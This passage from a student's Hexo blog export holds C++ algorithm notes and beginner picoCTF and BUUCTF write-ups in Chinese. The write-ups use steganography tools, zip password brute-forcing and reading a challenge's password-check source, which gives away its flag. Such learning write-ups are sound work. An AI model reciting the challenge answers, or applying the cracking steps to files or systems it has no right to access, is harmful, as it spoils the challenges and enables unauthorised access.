function_">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span><br>&#123;<br>    f[x][y]=<span class="hljs-string">&#x27;.&#x27;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> dx=<span class="hljs-number">-1</span>;dx&lt;=<span class="hljs-number">1</span>;dx++)<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> dy=<span class="hljs-number">-1</span>;dy&lt;=<span class="hljs-number">1</span>;dy++)<br>        &#123;<br>            <span class="hljs-type">int</span> nx=x+dx, ny=y+dy;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-number">0</span> &lt;= nx &amp;&amp; nx &lt; N &amp;&amp; <span class="hljs-number">0</span>&lt;=ny &amp;&amp; ny&lt; M &amp;&amp; f[nx][ny]==<span class="hljs-string">&#x27;W&#x27;</span>)<br>                dfs(nx,ny);<br>        &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">solve</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;M;j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(f[i][j]==<span class="hljs-string">&#x27;W&#x27;</span>)<br>            &#123;<br>                dfs(i, j);<br>                res++;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">cout</span>&lt;&lt;res&lt;&lt;<span class="hljs-built_in">endl</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">cin</span>&gt;&gt;N&gt;&gt;M;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++)<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;M;j++)<br>            <span class="hljs-built_in">cin</span>&gt;&gt;f[i][j];<br>    solve();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> DFS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Notes-STL-dfs</title>
      <link href="/2020/10/3fbdba09.html"/>
      <url>/2020/10/3fbdba09.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> book[<span class="hljs-number">101</span>],sum,n,e[<span class="hljs-number">101</span>][<span class="hljs-number">101</span>];<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> cur)</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;cur&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>sum++;<br><span class="hljs-keyword">if</span>(sum==n)<span class="hljs-keyword">return</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>&#123;<br><span class="hljs-keyword">if</span>(e[cur][i]==<span class="hljs-number">1</span> &amp;&amp; book[i] == <span class="hljs-number">0</span>)<br>&#123;<br>book[i]=<span class="hljs-number">1</span>;<br><span class="hljs-built_in">dfs</span>(i);<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> m,a,b;<br>cin&gt;&gt;n&gt;&gt;m;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>&#123;<br><span class="hljs-keyword">if</span>(i==j)e[i][j]=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">else</span> e[i][j]=<span class="hljs-number">99999999</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)<br>&#123;<br>cin&gt;&gt;a&gt;&gt;b;<br>e[a][b]=<span class="hljs-number">1</span>;<br>e[b][a]=<span class="hljs-number">1</span>;<br>&#125;<br><br>book[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;<br><span class="hljs-built_in">dfs</span>(<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Caser-Pass-Tool1-C++</title>
      <link href="/2020/10/992fe380.html"/>
      <url>/2020/10/992fe380.html</url>
      
        <content type="html"><![CDATA[<p>刷pico遇到一个凯撒密码加密题，顺手写了个解密工具，但是暂时没有解决到边界字母的升降档问题</p><span id="more"></span><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">char</span> s[<span class="hljs-number">100</span>];<br><span class="hljs-type">int</span> n,k,s2[<span class="hljs-number">100</span>];<br>cin&gt;&gt;n&gt;&gt;k;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br>cin&gt;&gt;s[i];<br>s2[i]=(<span class="hljs-type">int</span>)s[i];<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br>s2[i]+=k;<br>cout&lt;&lt;(<span class="hljs-type">char</span>)s2[i];<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>P.S C++大法好</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF-day1</title>
      <link href="/2020/10/fa61788.html"/>
      <url>/2020/10/fa61788.html</url>
      
        <content type="html"><![CDATA[<h1 id="Lets-Warm-Up"><a href="#Lets-Warm-Up" class="headerlink" title="Lets Warm Up"></a>Lets Warm Up</h1><p>If I told you a word started with 0x70 in hexadecimal, what would it start with in ASCII?</p><p>这应该就是签到题了吧？爱了爱了，十六进制转十进制再打表（突然ACM）转ASCII，得到‘p’，按照格式输入即可</p><span id="more"></span><h1 id="The-Numbers"><a href="#The-Numbers" class="headerlink" title="The Numbers"></a>The Numbers</h1><p>下载图片后得到一串数字，根据格式盲猜开头是picoCTF，然后又是一波打表- -，根据这几个字母和他们的数字就硬解出了这道题，拿到了Flag</p><h1 id="2Warm"><a href="#2Warm" class="headerlink" title="2Warm"></a>2Warm</h1><p>进制转换，啊这，这才是签到题吧- -</p><h1 id="Insp3ct0r"><a href="#Insp3ct0r" class="headerlink" title="Insp3ct0r"></a>Insp3ct0r</h1><p>打开网页源代码，找到1&#x2F;3的Flag，然后观察代码，发现一个css和一个js，可能答案藏在这里，打开之后分别找到第二第三部分，合并即可</p><h1 id="Glory-of-Garden"><a href="#Glory-of-Garden" class="headerlink" title="Glory of Garden"></a>Glory of Garden</h1><p>下载图片，一看就是老套路，第一页题目盲猜不会太深，直接开stegsolve看图片信息，果然找到了flag</p><h1 id="vault-door-training"><a href="#vault-door-training" class="headerlink" title="vault-door-training"></a>vault-door-training</h1><p>题目太长不看，下载java文件打开源码即得flag</p><h1 id="Warmed-UP"><a href="#Warmed-UP" class="headerlink" title="Warmed UP"></a>Warmed UP</h1><p>梅开二度，仿照前面进制转换</p><h1 id="vault-door-1"><a href="#vault-door-1" class="headerlink" title="vault-door-1"></a>vault-door-1</h1><p>本题是前面vault变种，打开源码看应该是一个登录的密码核对的处理机制。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">VaultDoor1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> &#123;<br>        <span class="hljs-type">VaultDoor1</span> <span class="hljs-variable">vaultDoor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VaultDoor1</span>();<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        System.out.print(<span class="hljs-string">&quot;Enter vault password: &quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">userInput</span> <span class="hljs-operator">=</span> scanner.next();<br><span class="hljs-type">String</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> userInput.substring(<span class="hljs-string">&quot;picoCTF&#123;&quot;</span>.length(),userInput.length()-<span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (vaultDoor.checkPassword(input)) &#123;<br>    System.out.println(<span class="hljs-string">&quot;Access granted.&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;Access denied!&quot;</span>);<br>&#125;<br>    &#125;<br><br>    <span class="hljs-comment">// I came up with a more secure way to check the password without putting</span><br>    <span class="hljs-comment">// the password itself in the source code. I think this is going to be</span><br>    <span class="hljs-comment">// UNHACKABLE!! I hope Dr. Evil agrees...</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// -Minion #8728</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkPassword</span><span class="hljs-params">(String password)</span> &#123;<br>        <span class="hljs-keyword">return</span> password.length() == <span class="hljs-number">32</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">0</span>)  == <span class="hljs-string">&#x27;d&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">29</span>) == <span class="hljs-string">&#x27;3&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">4</span>)  == <span class="hljs-string">&#x27;r&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">2</span>)  == <span class="hljs-string">&#x27;5&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">23</span>) == <span class="hljs-string">&#x27;r&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">3</span>)  == <span class="hljs-string">&#x27;c&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">17</span>) == <span class="hljs-string">&#x27;4&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">1</span>)  == <span class="hljs-string">&#x27;3&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">7</span>)  == <span class="hljs-string">&#x27;b&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">10</span>) == <span class="hljs-string">&#x27;_&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">5</span>)  == <span class="hljs-string">&#x27;4&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">9</span>)  == <span class="hljs-string">&#x27;3&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">11</span>) == <span class="hljs-string">&#x27;t&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">15</span>) == <span class="hljs-string">&#x27;c&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">8</span>)  == <span class="hljs-string">&#x27;l&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">12</span>) == <span class="hljs-string">&#x27;H&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">20</span>) == <span class="hljs-string">&#x27;c&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">14</span>) == <span class="hljs-string">&#x27;_&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">6</span>)  == <span class="hljs-string">&#x27;m&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">24</span>) == <span class="hljs-string">&#x27;5&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">18</span>) == <span class="hljs-string">&#x27;r&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">13</span>) == <span class="hljs-string">&#x27;3&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">19</span>) == <span class="hljs-string">&#x27;4&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">21</span>) == <span class="hljs-string">&#x27;T&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">16</span>) == <span class="hljs-string">&#x27;H&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">27</span>) == <span class="hljs-string">&#x27;f&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">30</span>) == <span class="hljs-string">&#x27;b&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">25</span>) == <span class="hljs-string">&#x27;_&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">22</span>) == <span class="hljs-string">&#x27;3&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">28</span>) == <span class="hljs-string">&#x27;6&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">26</span>) == <span class="hljs-string">&#x27;f&#x27;</span> &amp;&amp;<br>               password.charAt(<span class="hljs-number">31</span>) == <span class="hljs-string">&#x27;0&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是想要破解密码需要一点点技巧（一个一个手动核对实在是太麻烦了- -），感谢lrj学长的精心指导，让我想起了vs code可以对同样的字符片段进行批量操作，把前面的字符全部删除之后，利用python，把&#x3D;&#x3D;变成：，然后以数字作为key进行sort排序，然后批量提取即可得到flag，这个记录可圈可点</p><h1 id="what’s-a-net-cat"><a href="#what’s-a-net-cat" class="headerlink" title="what’s a net cat?"></a>what’s a net cat?</h1><p>没啥说的，打开Kali，打开终端</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">nc jupiter<span class="hljs-selector-class">.challenges</span><span class="hljs-selector-class">.picoctf</span><span class="hljs-selector-class">.org</span> <span class="hljs-number">54271</span><br></code></pre></td></tr></table></figure><p>即可得到flag</p><h1 id="Strings-it"><a href="#Strings-it" class="headerlink" title="Strings it"></a>Strings it</h1><p>这个下载下来，hint说的是不用打开，那就是hexo了，打开根据编码搜索‘ctf’无果，更换大小写‘CTF’查找几次之后即找到了flag</p><h1 id="Easy1"><a href="#Easy1" class="headerlink" title="Easy1"></a>Easy1</h1><p>这不就是OI的打表题吗，爱了爱了，根据给的table把他进行解码就可以得到flag</p><h1 id="where-are-the-robots"><a href="#where-are-the-robots" class="headerlink" title="where are the robots"></a>where are the robots</h1><p>打开链接以后，根据题目，应该指的是robot.txt，那就访问robot，又得到一个html，即可得到flag</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>dalao们都说picoCTF的题循序渐进，适合入门，看来确实是这样，今后就在这儿开坑了</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Notes-queue队列</title>
      <link href="/2020/10/64d83881.html"/>
      <url>/2020/10/64d83881.html</url>
      
        <content type="html"><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>队列的原理基本与站队一样，队首出，队尾入，变化以后也是大同小异，写起来主要就是注意struct的相关知识，以及伪指针（分别指向队首和队尾+1），队尾序号要+1以防首位变量数字重合造成不必要的麻烦（目前也不是很清楚会遇到什么）</p><span id="more"></span><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">queue</span><br>&#123;<br><span class="hljs-type">int</span> data[<span class="hljs-number">100</span>];<br><span class="hljs-type">int</span> head;<br><span class="hljs-type">int</span> tail;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">queue</span> q;<br><span class="hljs-type">int</span> i;<br>q.head=<span class="hljs-number">1</span>;<br>q.tail=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>; i&lt;=<span class="hljs-number">9</span>;i++)<br>&#123;<br>cin&gt;&gt;q.data[q.tail];<br>q.tail++;<br>&#125;<br><br><span class="hljs-keyword">while</span>(q.head&lt;q.tail)<br>&#123;<br>cout&lt;&lt;q.data[q.head];<br>q.head++;<br>q.data[q.tail]=q.data[q.head];<br>q.tail++;<br>q.head++;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>写的过程中主要一开始用万能头和STL里面的queue冲突报错了。。（想了好久），其他没什么，队列作为广搜和Bellman-Ford的最短路核心算法还是很有必要理解并记忆的</p>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Notes-QuickSort</title>
      <link href="/2020/10/12aa90f7.html"/>
      <url>/2020/10/12aa90f7.html</url>
      
        <content type="html"><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>快排基本思路应该就是二分+递归，从两侧同时（实则先从右往左）往中间找，同时和参变量对比，发现位置颠倒后交换位置，然后通过二分将其一块一块的分割开，直到分割到一个元素位置，即完成了快排。</p><span id="more"></span><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> a[<span class="hljs-number">101</span>],n;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">quicksort</span><span class="hljs-params">(<span class="hljs-type">int</span> left,<span class="hljs-type">int</span> right)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> i,j,t,temp;<span class="hljs-comment">//temp存基准数 </span><br><span class="hljs-keyword">if</span>(left&gt;right)<span class="hljs-keyword">return</span>;<br><br>temp=a[left];<br>i=left;<br>j=right;<br><span class="hljs-keyword">while</span>(i!=j)<br>&#123;<br><span class="hljs-keyword">while</span>(a[j]&gt;=temp &amp;&amp; i&lt;j)j--;<br><span class="hljs-keyword">while</span>(a[i]&lt;=temp &amp;&amp; i&lt;j)i++;<br><br><span class="hljs-keyword">if</span>(i&lt;j)<br>&#123;<br>t=a[i];<br>a[i]=a[j];<br>a[j]=t;<br>&#125;<br>&#125;<br><br>a[left]=a[i];<br>a[i]=temp;<br><br><span class="hljs-built_in">quicksort</span>(left, i<span class="hljs-number">-1</span>);<br><span class="hljs-built_in">quicksort</span>(i+<span class="hljs-number">1</span>,right);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>cin&gt;&gt;n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>cin&gt;&gt;a[i];<br><span class="hljs-built_in">quicksort</span>(<span class="hljs-number">1</span>,n);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>&#123;<br>cout&lt;&lt;a[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>快排应该是最常用的模板了，时间复杂度也比较理想</p><p>PS.致敬一波快排的提出者东尼·霍尔(C. A. R. Hoare)</p>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-misc-10/09</title>
      <link href="/2020/10/d61633e9.html"/>
      <url>/2020/10/d61633e9.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-金三胖"><a href="#1-金三胖" class="headerlink" title="1.金三胖"></a>1.金三胖</h1><p>典型入门题目，将GIF图片导入StegSolve，Analyse-&gt;Frame Browser，逐帧查看，将闪过的几张falg内容拼接起来即可</p><span id="more"></span><h1 id="2-二维码"><a href="#2-二维码" class="headerlink" title="2.二维码"></a>2.二维码</h1><p>到手先扫描，告诉我This is a Secret（？？？），然后下意识跟着上一题的思路想到图层扫描，经过几次仔细查看后我确定这个图片并没有什么隐藏的图层。。。然后想起来用老套路，放入Binwalk结果发现了夹在里面的压缩文件，爆破得到压缩文件密码即得Flag</p><h1 id="3-N种方法解决"><a href="#3-N种方法解决" class="headerlink" title="3.N种方法解决"></a>3.N种方法解决</h1><p>解压看到一个exe，放入winhex发现一个压缩文件，打开是图片，详细信息里面有base64特征的一串，解密后即得flag</p><h1 id="4-大白"><a href="#4-大白" class="headerlink" title="4.大白"></a>4.大白</h1><p>放入winhex发现图片高度被修改过，将高度修改回来即得flag</p><h1 id="5-你竟然赶我走"><a href="#5-你竟然赶我走" class="headerlink" title="5.你竟然赶我走"></a>5.你竟然赶我走</h1><p>winhex打开查看编码，在最后可发现flag的ASCII码</p><h1 id="6-基础破解"><a href="#6-基础破解" class="headerlink" title="6.基础破解"></a>6.基础破解</h1><p>梅开二度，爆破密码，得到base64，解密即为FLAG</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
